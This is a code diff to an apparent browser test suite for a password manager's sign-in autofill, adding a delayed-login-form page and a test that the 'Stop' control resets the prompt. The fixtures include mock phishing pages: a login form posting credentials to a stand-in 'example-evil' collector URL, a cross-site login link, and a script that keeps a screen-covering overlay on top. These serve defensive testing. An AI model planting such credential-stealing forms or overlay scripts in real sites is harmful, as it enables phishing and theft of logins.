@@ -55,6 +55,7 @@ const pages = {
   'captcha.example.test/': doc(`${loginForm('/never')}<div class="g-captcha" style="width:300px;height:70px">check</div>`),
   'jump.example.test/': doc('<a href="https://jump.example-evil.test/login">Log in</a>'),
   'leak.example.test/': doc(loginForm('https://collector.example-evil.test/steal')),
+  'stop.example.test/': doc(`<button id="open">Log in</button><script>document.querySelector('#open').addEventListener('click',()=>setTimeout(()=>{document.body.insertAdjacentHTML('beforeend',${JSON.stringify(loginForm('/never'))})},8000))</script>`),
   'formjump.example.test/': doc('<form method="post" action="https://collector.example-evil.test/steal"><button>Log in</button></form>'),
   'member.example.test/': doc(`<nav hidden><a href="/out">Log out</a></nav>${loginForm('/never')}`),
   'join.example.test/signup': doc(loginForm('/never')),
@@ -65,7 +66,7 @@ const pages = {
   'cover.example.test/': doc(`${loginForm('/never')}<div style="position:fixed;inset:0;z-index:2147483647;background:#0003" id="cover"></div><script>setInterval(()=>{const c=document.querySelector('#cover');if(document.documentElement.lastElementChild!==c)document.documentElement.append(c)},50)</script>`),
 };
 const entries = [['AWS', 'console.aws.amazon.com', true], ['X', 'x.com'], ['LinkedIn', 'www.linkedin.com'], ['GitHub', 'github.com'],
-  ...['wrong', 'totp', 'sms', 'captcha', 'jump', 'leak', 'member', 'join', 'cover', 'menu', 'formjump'].map(name => [name, `${name}.example.test`, name === 'totp'])];
+  ...['wrong', 'totp', 'sms', 'captcha', 'jump', 'leak', 'member', 'join', 'cover', 'menu', 'formjump', 'stop'].map(name => [name, `${name}.example.test`, name === 'totp'])];
 try {
   const vault = api.vaults[0];
   for (const [label, host, withTotp] of entries) {
@@ -122,7 +123,7 @@ try {
     let node;
     // Only the toast's own control: the site may carry the same caption.
     await until(async () => {
-      const all = (await cdp.send('Accessibility.getFullAXTree')).nodes, region = all.find(item => !item.ignored && ['region', 'status'].includes(item.role?.value) && ['Sign in', 'Finish on this page'].includes(item.name?.value));
+      const all = (await cdp.send('Accessibility.getFullAXTree')).nodes, region = all.find(item => !item.ignored && ((item.role?.value === 'region' && item.name?.value === 'Sign in') || (item.role?.value === 'status' && /^(Finish on this page|Opening sign-in)/.test(item.name?.value ?? ''))));
       if (!region) return false;
       const inside = new Set([region.nodeId]);
       for (let changed = true; changed;) { changed = false; for (const item of all) if (!inside.has(item.nodeId) && inside.has(item.parentId)) { inside.add(item.nodeId); changed = true; } }
@@ -189,6 +190,11 @@ try {
     async crossSite() {
       await signIn('https://jump.example.test/'); await says('Finish on this page');
       assert.equal(requests.some(item => item.key.includes('example-evil')), false); pass('never follows a sign-in link to another site');
+    },
+    async stop() {
+      await signIn('https://stop.example.test/'); await says('Stop'); await press('Stop');
+      await until(async () => Boolean(await toast()) && !(await texts()).includes('Stop'), 'ready toast after Stop', 4_000);
+      pass('Stop returns the toast to its ready state');
     },
     async formJump() {
       await signIn('https://formjump.example.test/'); await says('Finish on this page');
